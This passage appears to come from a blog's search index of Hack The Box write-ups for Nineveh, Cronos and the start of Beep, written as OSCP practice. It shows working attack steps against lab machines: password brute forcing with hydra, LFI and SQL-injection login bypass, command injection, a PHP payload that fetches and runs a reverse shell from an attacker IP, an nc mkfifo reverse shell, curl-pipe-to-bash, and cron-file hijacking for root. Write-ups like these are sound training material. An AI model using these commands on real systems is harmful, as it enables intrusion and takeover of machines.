Not valid after: 2018-07-01T15:03:30 | MD5: d182 94b8 0210 7992 bf01 e802 b26f 8639 | SHA-1: 2275 b03e 27bd 1226 fdaa 8b0f 6de9 84f0 113b 42c0 | -----BEGIN CERTIFICATE----- | MIID+TCCAuGgAwIBAgIJANwojrkai1UOMA0GCSqGSIb3DQEBCwUAMIGSMQswCQYD | VQQGEwJHUjEPMA0GA1UECAwGQXRoZW5zMQ8wDQYDVQQHDAZBdGhlbnMxFzAVBgNV | BAoMDkhhY2tUaGVCb3ggTHRkMRAwDgYDVQQLDAdTdXBwb3J0MRQwEgYDVQQDDAtu | aW5ldmVoLmh0YjEgMB4GCSqGSIb3DQEJARYRYWRtaW5AbmluZXZlaC5odGIwHhcN | MTcwNzAxMTUwMzMwWhcNMTgwNzAxMTUwMzMwWjCBkjELMAkGA1UEBhMCR1IxDzAN | BgNVBAgMBkF0aGVuczEPMA0GA1UEBwwGQXRoZW5zMRcwFQYDVQQKDA5IYWNrVGhl | Qm94IEx0ZDEQMA4GA1UECwwHU3VwcG9ydDEUMBIGA1UEAwwLbmluZXZlaC5odGIx | IDAeBgkqhkiG9w0BCQEWEWFkbWluQG5pbmV2ZWguaHRiMIIBIjANBgkqhkiG9w0B | AQEFAAOCAQ8AMIIBCgKCAQEA+HUDrGgG769A68bslDXjV/uBaw18SaF52iEz/ui2 | WwXguHnY8BS7ZetS4jAso6BOrGUZpN3+278mROPa4khQlmZ09cj8kQ4k7lOIxSlp | eZxvt+R8fkJvtA7e47nvwP4H2O6SI0nD/pGDZc05i842kOc/8Kw+gKkglotGi8ZO | GiuRgzyfdaNSWC7Lj3gTjVMCllhc6PgcQf9r7vK1KPkyFleYDUwB0dwf3taN0J2C | U2EHz/4U1l40HoIngkwfhFI+2z2J/xx2JP+iFUcsV7LQRw0x4g6Z5WFWETluWUHi | AWUZHrjMpMaXs3TZNNW81tWUP2jBulX5kv6H5CTocsXgyQIDAQABo1AwTjAdBgNV | HQ4EFgQUh0YSfVOI05WyOFntGykwc3/OzrMwHwYDVR0jBBgwFoAUh0YSfVOI05Wy | OFntGykwc3/OzrMwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAehma | AJKuLeAHqHAIcLopQg9mE28lYDGxf+3eIEuUAHmUKs0qGLs3ZTY8J77XTxmjvH1U | qYVXfZSub1IG7LgUFybLFKNl6gioKEPXXA9ofKdoJX6Bar/0G/15YRSEZGc9WXh4 | Xh1Qr3rkYYZj/rJa4H5uiWoRFofSTNGMfbY8iF8X2+P2LwyEOqThypdMBKMiIt6d | 7sSuqsrnQRa73OdqdoCpHxEG6antne6Vvz3ALxv4cI7SqzKiQvH1zdJ/jOhZK1g1 | CxLUGYbNsjIJWSdOoSlIgRswnu+A+O612+iosxYaYdCUZ8BElgjUAXLEHzuUFtRb | KrYQgX28Ulf8OSGJuA== |_-----END CERTIFICATE----- |_http-title: Site doesn\u0026#39;t have a title (text/html). | http-methods: |_ Supported Methods: POST OPTIONS GET HEAD | tls-alpn: |_ http/1.1 |_ssl-date: TLS randomness does not represent time |_http-server-header: Apache/2.4.18 (Ubuntu) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port OS fingerprint not ideal because: Missing a closed TCP port so results incomplete   Directory Enum 1 2 3 4 5  dirb http://10.10.10.43/ + http://10.10.10.43/index.html (CODE:200|SIZE:178) + http://10.10.10.43/info.php (CODE:200|SIZE:83767) + http://10.10.10.43/server-status (CODE:403|SIZE:299)   1 2 3 4 5  dirb https://10.10.10.43/ ==\u0026gt; DIRECTORY: https://10.10.10.43/db/ + https://10.10.10.43/index.html (CODE:200|SIZE:49) + https://10.10.10.43/server-status (CODE:403|SIZE:300)   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  gobuster dir -u http://10.10.10.43/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt Gobuster v3.1.0 by OJ Reeves (@TheColonial) \u0026amp; Christian Mehlmauer (@firefart) =============================================================== [+] Url: http://10.10.10.43/ [+] Method: GET [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Negative Status codes: 404 [+] User Agent: gobuster/3.1.0 [+] Timeout: 10s =============================================================== 2022/02/22 20:17:21 Starting gobuster in directory enumeration mode =============================================================== /department   Dirbuster Brute force -\u0026gt; /department 1 2 3 4 5  hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form \u0026#34;/department/login.php:username=^USER^\u0026amp;password=^PASS^:Invalid Password\\!\u0026#34; # \\ -\u0026gt; escaping the the ! character -\u0026gt; login: admin | password: 1q2w3e4r5t -\u0026gt; http://10.10.10.43/department/login.php -\u0026gt; [80][http-post-form] host: 10.10.10.43 login: admin password: 1q2w3e4r5t   login: admin | password: 1q2w3e4r5t\nLFI  https://www.exploit-db.com/exploits/24044 After getting access into → http://10.10.10.43/department Found LFI in notes=files/ninevehNotes.txt   Create a New Database hack.php Create a new table and insert a text field with default value:  We can rename the database to ninevehNotes.php Visiting → notes=/var/tmp/ninevehNotes.php  1  http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt../../../../../../../etc/passwd   Exploitation Reverse Shell 1 2 3 4 5 6 7 8 9 10 11  locate php revese cp /usr/share/webshells/php/php-reverse-shell.php ./ mv php-reverse-shell.php shell.txt # Modify php shell with correct IP nc -lvnp 1234 python -m SimpleHTTPServer    Edit the table with the following  1  \u0026lt;?php system(\u0026#34;wget http://10.10.14.38:8000/shell.txt -O /tmp/shell.php; php /tmp/shell.php\u0026#34;); ?\u0026gt;   1 2  # Fire the shell by visiting the url http://10.10.10.43/department/manage.php?notes=/var/tmp/ninevehNotes.php   Interactive Shell 1 2 3 4 5 6 7 8 9 10 11 12  which python which python3 python3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; CTRL + Z stty raw -echo fg [Press Enter] export TERM=screen   Privelege Escalation  There is a report folder  1  ps aux    Found sshd but there was no ssh during nmap  1 2 3  ls /usr/sbin -\u0026gt; knock -\u0026gt; chroot    Google chkrootkit → https://www.exploit-db.com/exploits/33899  1  www-data@nineveh$ cd /tmp # upload executable reverse shell   1 2 3 4 5  nano update rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2\u0026gt;\u0026amp;1|nc 10.10.14.50 9000 \u0026gt;/tmp/f nc -lvnp 9000   1 2  www-data@nineveh:/tmp$ wget http://10.10.14.50:8000/update chmod +x update   Port Knocking 1 2 3  # Running the LinEnum.sh on the attacking machine curl 10.10.14.38:8000/LinEnum.sh | bash    There was no port 22 in port enumeration https://github.com/grongor/knock  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22  locate knockd -\u0026gt; /etc/knockd.conf /etc/default/knockd /etc/init.d/knockd cat /etc/knockd.conf -\u0026gt; logfile = /var/log/knockd.log interface = ens160 [openSSH] sequence = 571, 290, 911 seq_timeout = 5 start_command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn [closeSSH] sequence = 911,290,571 seq_timeout = 5 start_command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn    Sequence 571, 290, 911  1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24  for x in 571 290 911; do nmap -Pn --max-retries 0 -p $x 10.10.10.43; done ------------------------------------------------------------ PORT STATE SERVICE 571/tcp filtered umeter Nmap done: 1 IP address (1 host up) scanned in 1.13 seconds Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-25 16:08 EST Warning: 10.10.10.43 giving up on port because retransmission cap hit (0). Nmap scan report for 10.10.10.43 Host is up. PORT STATE SERVICE 290/tcp filtered unknown Nmap done: 1 IP address (1 host up) scanned in 1.13 seconds Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-25 16:08 EST Warning: 10.10.10.43 giving up on port because retransmission cap hit (0). Nmap scan report for 10.10.10.43 Host is up. PORT STATE SERVICE 911/tcp filtered xact-backup ------------------------------------------------------------   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27  # in the nmap scan we found a private certificate nano id_rsa | -----BEGIN CERTIFICATE----- | MIID+TCCAuGgAwIBAgIJANwojrkai1UOMA0GCSqGSIb3DQEBCwUAMIGSMQswCQYD | VQQGEwJHUjEPMA0GA1UECAwGQXRoZW5zMQ8wDQYDVQQHDAZBdGhlbnMxFzAVBgNV | BAoMDkhhY2tUaGVCb3ggTHRkMRAwDgYDVQQLDAdTdXBwb3J0MRQwEgYDVQQDDAtu | aW5ldmVoLmh0YjEgMB4GCSqGSIb3DQEJARYRYWRtaW5AbmluZXZlaC5odGIwHhcN | MTcwNzAxMTUwMzMwWhcNMTgwNzAxMTUwMzMwWjCBkjELMAkGA1UEBhMCR1IxDzAN | BgNVBAgMBkF0aGVuczEPMA0GA1UEBwwGQXRoZW5zMRcwFQYDVQQKDA5IYWNrVGhl | Qm94IEx0ZDEQMA4GA1UECwwHU3VwcG9ydDEUMBIGA1UEAwwLbmluZXZlaC5odGIx | IDAeBgkqhkiG9w0BCQEWEWFkbWluQG5pbmV2ZWguaHRiMIIBIjANBgkqhkiG9w0B | AQEFAAOCAQ8AMIIBCgKCAQEA+HUDrGgG769A68bslDXjV/uBaw18SaF52iEz/ui2 | WwXguHnY8BS7ZetS4jAso6BOrGUZpN3+278mROPa4khQlmZ09cj8kQ4k7lOIxSlp | eZxvt+R8fkJvtA7e47nvwP4H2O6SI0nD/pGDZc05i842kOc/8Kw+gKkglotGi8ZO | GiuRgzyfdaNSWC7Lj3gTjVMCllhc6PgcQf9r7vK1KPkyFleYDUwB0dwf3taN0J2C | U2EHz/4U1l40HoIngkwfhFI+2z2J/xx2JP+iFUcsV7LQRw0x4g6Z5WFWETluWUHi | AWUZHrjMpMaXs3TZNNW81tWUP2jBulX5kv6H5CTocsXgyQIDAQABo1AwTjAdBgNV | HQ4EFgQUh0YSfVOI05WyOFntGykwc3/OzrMwHwYDVR0jBBgwFoAUh0YSfVOI05Wy | OFntGykwc3/OzrMwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAQEAehma | AJKuLeAHqHAIcLopQg9mE28lYDGxf+3eIEuUAHmUKs0qGLs3ZTY8J77XTxmjvH1U | qYVXfZSub1IG7LgUFybLFKNl6gioKEPXXA9ofKdoJX6Bar/0G/15YRSEZGc9WXh4 | Xh1Qr3rkYYZj/rJa4H5uiWoRFofSTNGMfbY8iF8X2+P2LwyEOqThypdMBKMiIt6d | 7sSuqsrnQRa73OdqdoCpHxEG6antne6Vvz3ALxv4cI7SqzKiQvH1zdJ/jOhZK1g1 | CxLUGYbNsjIJWSdOoSlIgRswnu+A+O612+iosxYaYdCUZ8BElgjUAXLEHzuUFtRb | KrYQgX28Ulf8OSGJuA== |_-----END CERTIFICATE-----   1 2 3  git clone https://github.com/grongor/knock python3 knock 10.10.10.43 571 290 911   Skills Learned  HTTP-based brute forcing Chaining exploits Local file inclusion Port knocking  ","description":"Nineveh is not overly challenging, however several exploits must be chained to gain initial access. Several uncommon services are running on the machine and some research is required to enumerate them","id":2,"section":"posts","tags":["OSCP","linux","apache","brute force attack","cve","phpliteadmin","weak credentials","chkrootkit","lfi","kernel","system exploitation","port knocking"],"title":"Hackthebox - Nineveh","uri":"https://hswootan.github.io/en/posts/nineveh/"},{"content":"Enumeration 1  nmap -sV -sC -O -vv 10.10.10.13 -oA cronos   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 7.2p2 Ubuntu 4ubuntu2.1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 18:b9:73:82:6f:26:c7:78:8f:1b:39:88:d8:02:ce:e8 (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCkOUbDfxsLPWvII72vC7hU4sfLkKVEqyHRpvPWV2+5s2S4kH0rS25C/R+pyGIKHF9LGWTqTChmTbcRJLZE4cJCCOEoIyoeXUZWMYJCqV8crflHiVG7Zx3wdUJ4yb54G6NlS4CQFwChHEH9xHlqsJhkpkYEnmKc+CvMzCbn6CZn9KayOuHPy5NEqTRIHObjIEhbrz2ho8+bKP43fJpWFEx0bAzFFGzU0fMEt8Mj5j71JEpSws4GEgMycq4lQMuw8g6Acf4AqvGC5zqpf2VRID0BDi3gdD1vvX2d67QzHJTPA5wgCk/KzoIAovEwGqjIvWnTzXLL8TilZI6/PV8wPHzn | 256 1a:e6:06:a6:05:0b:bb:41:92:b0:28:bf:7f:e5:96:3b (ECDSA) | ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKWsTNMJT9n5sJr5U1iP8dcbkBrDMs4yp7RRAvuu10E6FmORRY/qrokZVNagS1SA9mC6eaxkgW6NBgBEggm3kfQ= | 256 1a:0e:e7:ba:00:cc:02:01:04💿a3:a9:3f:5e:22:20 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHBIQsAL/XR/HGmUzGZgRJe/1lQvrFWnODXvxQ1Dc+Zx 53/tcp open domain syn-ack ttl 63 ISC BIND 9.10.3-P4 (Ubuntu Linux) | dns-nsid: |_ bind.version: 9.10.3-P4-Ubuntu 80/tcp open http syn-ack ttl 63 Apache httpd 2.4.18 ((Ubuntu)) | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-title: Apache2 Ubuntu Default Page: It works |_http-server-header: Apache/2.4.18 (Ubuntu)    Nothing interesting in port 80 We see DNS on port 53 we can further enumerate DNS  Zone Transfer 1  dig axfr cronos.htb @10.10.10.13   1  host -l cronos.htb 10.10.10.13   1 2 3 4 5 6 7 8 9 10 11 12 13  \u0026lt;\u0026lt;\u0026gt;\u0026gt; DiG 9.17.20-3-Debian \u0026lt;\u0026lt;\u0026gt;\u0026gt; axfr cronos.htb @10.10.10.13 ;; global options: +cmd cronos.htb. 604800 IN SOA cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800 cronos.htb. 604800 IN NS ns1.cronos.htb. cronos.htb. 604800 IN A 10.10.10.13 admin.cronos.htb. 604800 IN A 10.10.10.13 ns1.cronos.htb. 604800 IN A 10.10.10.13 www.cronos.htb. 604800 IN A 10.10.10.13 cronos.htb. 604800 IN SOA cronos.htb. admin.cronos.htb. 3 604800 86400 2419200 604800 ;; Query time: 24 msec ;; SERVER: 10.10.10.13#53(10.10.10.13) (TCP) ;; WHEN: Thu Feb 10 18:54:40 EST 2022 ;; XFR size: 7 records (messages 1, bytes 203)   1  nano /etc/hosts    Can go to → http://cronos.htb Can go to →http://admin.cronos.htb/  SQL Injection Auth bypass  SQL Inject the login page  SQL Injection cheat sheet →https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/    1 2 3 4 5 6  # Worked with admin\u0026#39; # UserName: admin\u0026#39; # Password: admin\u0026#39; #   Exploitation  The search traceroute is injectable  1  8.8.8.8; ls -al   1 2  8.8.8.8; cat /home/noulis/user.txt -\u0026gt; user.txt -\u0026gt; ********************************    Found something in admin  1 2 3 4 5 6 7 8 9 10  cd admin cat config.php -\u0026gt; \u0026lt;?php define(\u0026#39;DB_SERVER\u0026#39;, \u0026#39;localhost\u0026#39;); define(\u0026#39;DB_USERNAME\u0026#39;, \u0026#39;admin\u0026#39;); define(\u0026#39;DB_PASSWORD\u0026#39;, \u0026#39;kEjdbRigfBHUREiNSDs\u0026#39;); define(\u0026#39;DB_DATABASE\u0026#39;, \u0026#39;admin\u0026#39;); $db = mysqli_connect(DB_SERVER,DB_USERNAME,DB_PASSWORD,DB_DATABASE); ?\u0026gt;   Privilege Escalation Cronjobs 1 2 3 4 5 6 7  cat /etc/crontab -\u0026gt; # m h dom mon dow user command 17 * * * * root cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.hourly 25 6 * * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.daily ) 47 6 * * 7 root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.weekly ) 52 6 1 * * root test -x /usr/sbin/anacron || ( cd / \u0026amp;\u0026amp; run-parts --report /etc/cron.monthly ) * * * * * root php /var/www/laravel/artisan schedule:run \u0026gt;\u0026gt; /dev/null 2\u0026gt;\u0026amp;1   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71  # We can use php reverse shell but we need to delete what is in the schedule run by running cd /var/www/laravel/ cat artisan #!/usr/bin/env php \u0026lt;?php /* |-------------------------------------------------------------------------- | Register The Auto Loader |-------------------------------------------------------------------------- | | Composer provides a convenient, automatically generated class loader | for our application. We just need to utilize it! We\u0026#39;ll require it | into the script here so that we do not have to worry about the | loading of any our classes \u0026#34;manually\u0026#34;. Feels great to relax. | */ require __DIR__.\u0026#39;/bootstrap/autoload.php\u0026#39;; $app = require_once __DIR__.\u0026#39;/bootstrap/app.php\u0026#39;; /* |-------------------------------------------------------------------------- | Run The Artisan Application |-------------------------------------------------------------------------- | | When we run the console application, the current CLI command will be | executed in this console and the response sent back to a terminal | or another output device for the developers. Here goes nothing! | */ $kernel = $app-\u0026gt;make(Illuminate\\Contracts\\Console\\Kernel::class); $status = $kernel-\u0026gt;handle( $input = new Symfony\\Component\\Console\\Input\\ArgvInput, new Symfony\\Component\\Console\\Output\\ConsoleOutput ); /* |-------------------------------------------------------------------------- | Shutdown The Application |-------------------------------------------------------------------------- | | Once Artisan has finished running. We will fire off the shutdown events | so that any final work may be done by the application before we shut | down the process. This is the last thing to happen to the request. | */ $kernel-\u0026gt;terminate($input, $status); exit($status); cat /dev/null \u0026gt; artisan locate php reverse cp /usr/share/webshells/php/php-reverse-shell.php ./ mv php-reverse-shell.php rev.php # Modify the php-reverse-shell with the correct values python -m SimpleHTTPServer wget   Reverse shell 1 2 3 4 5 6  which wget -\u0026gt; /usr/bin/wget wget 10.10.14.50:8000/rev.php ./ # Transfer the php reverse payload to the attacking machine cp rev.php artisan # Wait for the reverse shell     We are root  1 2 3  cd root cat root.txt -\u0026gt; ********************************   Another way to get Root by uploading the php reverse shell 1 2 3 4 5 6 7 8 9 10 11  cat /etc/crontab cat /dev/null # delete what it is in the file cd /home/sake/HTB/oscp_boxes/cronos #  python -m SimpleHTTPServer echo \u0026#34;\u0026lt;?php system(\u0026#39;curl http://10.10.14.50:8000/rev.php | php\u0026#39;)?\u0026gt;\u0026#34; \u0026gt; artisan cat cartisan # wait 30 secs and will get root   Skills Learned  SQL Injection Command injection Exploiting cron jobs  ","description":"CronOS focuses mainly on different vectors for enumeration and also emphasises the risks associated with adding world-writable files to the root crontab. This machine also includes an introductory-level SQL injection vulnerability.","id":3,"section":"posts","tags":["OSCP","linux","php","apache","os command injection","cve","deserialization","ssh","dns","sql injection","crontab"],"title":"Hackthebox - Cronos","uri":"https://hswootan.github.io/en/posts/cronos/"},{"content":"Enumeration 1  nmap -sV -sC -O -vv 10.10.10.7 -oA beep   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104  Host is up, received reset ttl 63 (0.019s latency). Scanned at 2022-02-09 09:23:48 EST for 396s Not shown: 988 closed tcp ports (reset) PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 63 OpenSSH 4.3 (protocol 2.0) | ssh-hostkey: | 1024 ad:ee:5a:bb:69:37:fb:27:af:b8:30:72:a0:f9:6f:53 (DSA) | ssh-dss AAAAB3NzaC1kc3MAAACBAI04jN+Sn7/9f2k+5UteAWn8KKj3FRGuF4LyeDmo/xxuHgSsdCjYuWtNS8m7stqgNH5edUu8vZ0pzF/quX5kphWg/UOz9weGeGyzde5lfb8epRlTQ2kfbP00l+kq9ztuWaXOsZQGcSR9iKE4lLRJhRCLYPaEbuxKnYz4WhAv4yD5AAAAFQDXgQ9BbvoxeDahe/ksAac2ECqflwAAAIEAiGdIue6mgTfdz/HikSp8DB6SkVh4xjpTTZE8L/HOVpTUYtFYKYj9eG0W1WYo+lGg6SveATlp3EE/7Y6BqdtJNm0RfR8kihoqSL0VzKT7myerJWmP2EavMRPjkbXw32fVBdCGjBqMgDl/QSEn2NNDu8OAyQUVBEHrE4xPGI825qgAAACANnqx2XdVmY8agjD7eFLmS+EovCIRz2+iE+5chaljGD/27OgpGcjdZNN+xm85PPFjUKJQuWmwMVTQRdza6TSp9vvQAgFh3bUtTV3dzDCuoR1D2Ybj9p/bMPnyw62jgBPxj5lVd27LTBi8IAH2fZnct7794Y3Ge+5r4Pm8Qbrpy68= | 2048 bc:c6:73:59:13:a1:8a:4b:55:07:50:f6:65:1d:6d:0d (RSA) |_ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEA4SXumrUtyO/pcRLwmvnF25NG/ozHsxSVNRmTwEf7AYubgpAo4aUuvhZXg5iymwTcZd6vm46Y+TX39NQV/yT6ilAEtLbrj1PLjJl+UTS8HDIKl6QgIb1b3vuEjbVjDj1LTq0Puzx52Es0/86WJNRVwh4c9vN8MtYteMb/dE2Azk0SQMtpBP+4Lul4kQrNwl/qjg+lQ7XE+NU7Va22dpEjLv/TjHAKImQu2EqPsC99sePp8PP5LdNbda6KHsSrZXnK9hqpxnwattPHT19D94NHVmMHfea9gXN3NCI3NVfDHQsxhqVtR/LiZzpbKHldFU0lfZYH1aTdBfxvMLrVhasZcw== 25/tcp open smtp syn-ack ttl 63 Postfix smtpd |_smtp-commands: beep.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, ENHANCEDSTATUSCODES, 8BITMIME, DSN 80/tcp open http syn-ack ttl 63 Apache httpd 2.2.3 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.2.3 (CentOS) |_http-title: Did not follow redirect to https://10.10.10.7/ 110/tcp open pop3 syn-ack ttl 63 Cyrus pop3d 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 |_pop3-capabilities: PIPELINING APOP EXPIRE(NEVER) RESP-CODES UIDL IMPLEMENTATION(Cyrus POP3 server v2) USER AUTH-RESP-CODE STLS LOGIN-DELAY(0) TOP 111/tcp open rpcbind syn-ack ttl 63 2 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2 111/tcp rpcbind | 100000 2 111/udp rpcbind | 100024 1 876/udp status |_ 100024 1 879/tcp status 143/tcp open imap syn-ack ttl 63 Cyrus imapd 2.3.7-Invoca-RPM-2.3.7-7.el5_6.4 |_imap-capabilities: UNSELECT RENAME URLAUTHA0001 LITERAL+ ACL ID X-NETSCAPE IMAP4 OK BINARY NO LIST-SUBSCRIBED LISTEXT THREAD=REFERENCES ANNOTATEMORE ATOMIC CONDSTORE RIGHTS=kxte UIDPLUS CATENATE THREAD=ORDEREDSUBJECT SORT=MODSEQ CHILDREN IMAP4rev1 SORT MULTIAPPEND QUOTA Completed NAMESPACE MAILBOX-REFERRALS IDLE STARTTLS 443/tcp open ssl/http syn-ack ttl 63 Apache httpd 2.2.3 ((CentOS)) |_ssl-date: 2022-02-09T15:27:21+00:00; +1h00m00s from scanner time. | ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/emailAddress=root@localhost.localdomain/organizationalUnitName=SomeOrganizationalUnit/localityName=SomeCity | Issuer: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/emailAddress=root@localhost.localdomain/organizationalUnitName=SomeOrganizationalUnit/localityName=SomeCity | Public Key type: rsa | Public Key bits: 1024 | Signature Algorithm: sha1WithRSAEncryption | Not valid before: 2017-04-07T08:22:08 | Not valid after: 2018-04-07T08:22:08 | MD5: 621a 82b6 cf7e 1afa 5284 1c91 60c8 fbc8 | SHA-1: 800a c6e7 065e 1198 0187 c452 0d9b 18ef e557 a09f | -----BEGIN CERTIFICATE----- | MIIEDjCCA3egAwIBAgICfVUwDQYJKoZIhvcNAQEFBQAwgbsxCzAJBgNVBAYTAi0t | MRIwEAYDVQQIEwlTb21lU3RhdGUxETAPBgNVBAcTCFNvbWVDaXR5MRkwFwYDVQQK | ExBTb21lT3JnYW5pemF0aW9uMR8wHQYDVQQLExZTb21lT3JnYW5pemF0aW9uYWxV | bml0MR4wHAYDVQQDExVsb2NhbGhvc3QubG9jYWxkb21haW4xKTAnBgkqhkiG9w0B | CQEWGnJvb3RAbG9jYWxob3N0LmxvY2FsZG9tYWluMB4XDTE3MDQwNzA4MjIwOFoX | DTE4MDQwNzA4MjIwOFowgbsxCzAJBgNVBAYTAi0tMRIwEAYDVQQIEwlTb21lU3Rh | dGUxETAPBgNVBAcTCFNvbWVDaXR5MRkwFwYDVQQKExBTb21lT3JnYW5pemF0aW9u | MR8wHQYDVQQLExZTb21lT3JnYW5pemF0aW9uYWxVbml0MR4wHAYDVQQDExVsb2Nh | bGhvc3QubG9jYWxkb21haW4xKTAnBgkqhkiG9w0BCQEWGnJvb3RAbG9jYWxob3N0 | LmxvY2FsZG9tYWluMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC3e4HhLYPN | gwJ4eKlW/UpmemPfK/a3mcafSqx/AJP34OC0Twj/cZNaqFPLOWfNjcq4mmiV++9a | oJCkj4apDkyICI1emsrPaRdrlA/cCXcn3nupfOgcfpBV4vqNfqorEqpJCO7T4bcp | Z6YHuxtRtP7gRJiE1ytAFP2jDvtvMqEWkwIDAQABo4IBHTCCARkwHQYDVR0OBBYE | FL/OLJ7hJVedlL5Gk0fYvo6bZkqWMIHpBgNVHSMEgeEwgd6AFL/OLJ7hJVedlL5G | k0fYvo6bZkqWoYHBpIG+MIG7MQswCQYDVQQGEwItLTESMBAGA1UECBMJU29tZVN0 | YXRlMREwDwYDVQQHEwhTb21lQ2l0eTEZMBcGA1UEChMQU29tZU9yZ2FuaXphdGlv | bjEfMB0GA1UECxMWU29tZU9yZ2FuaXphdGlvbmFsVW5pdDEeMBwGA1UEAxMVbG9j | YWxob3N0LmxvY2FsZG9tYWluMSkwJwYJKoZIhvcNAQkBFhpyb290QGxvY2FsaG9z | dC5sb2NhbGRvbWFpboICfVUwDAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQUFAAOB | gQA+ah2n+bomON94KgibPEVPpmW+8N6Sq3f4qDG54urTnPD39GrYHvMwA3B2ang9 | l3zta5tXYAVj22kiNM2si4bOMQsa6FZR4AEzWCq9tZS/vTCCRaT79mWj3bUvtDkV | 2ScJ9I/7b4/cPHDOrAKdzdKxEE2oM0cwKxSnYBJk/4aJIw== |_-----END CERTIFICATE----- | http-robots.txt: 1 disallowed entry |_/ |_http-favicon: Unknown favicon MD5: 80DCC71362B27C7D0E608B0890C05E9F |_http-title: Elastix - Login page | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-server-header: Apache/2.2.3 (CentOS) 993/tcp open ssl/imap syn-ack ttl 63 Cyrus imapd |_imap-capabilities: CAPABILITY 995/tcp open pop3 syn-ack ttl 63 Cyrus pop3d 3306/tcp open mysql syn-ack ttl 63 MySQL (unauthorized) |_ssl-cert: ERROR: Script execution failed (use -d to debug) |_ssl-date: ERROR: Script execution failed (use -d to debug) |_sslv2: ERROR: Script execution failed (use -d to debug) |_tls-nextprotoneg: ERROR: Script execution failed (use -d to debug) |_tls-alpn: ERROR: Script execution failed (use -d to debug) 4445/tcp open upnotifyp? syn-ack ttl 63 10000/tcp open http syn-ack ttl 63 MiniServ 1.570 (Webmin httpd) |_http-server-header: MiniServ/1.570 | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS |_http-favicon: Unknown favicon MD5: 74F7F6F633A027FA3EA36F05004C9341 |_http-title: Site doesn\u0026#39;t have a title (text/html; Charset=iso-8859-1). No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ). TCP/IP fingerprint: OS:SCAN(V=7.92%E=4%D=2/9%OT=22%CT=1%CU=36256%PV=Y%DS=2%DC=I%G=Y%TM=6203D000 OS:%P=x86_64-pc-linux-gnu)SEQ(SP=C9%GCD=1%ISR=CE%TI=Z%CI=Z%II=I%TS=A)OPS(O1 OS:=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11NW OS:7%O6=M505ST11)WIN(W1=16A0%W2=16A0%W3=16A0%W4=16A0%W5=16A0%W6=16A0)ECN(R= OS:Y%DF=Y%T=40%W=16D0%O=M505NNSNW7%CC=N%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%R OS:D=0%Q=)T2(R=N)T3(R=Y%DF=Y%T=40%W=16A0%S=O%A=S+%F=AS%O=M505ST11NW7%RD=0%Q OS:=)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A OS:=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%D 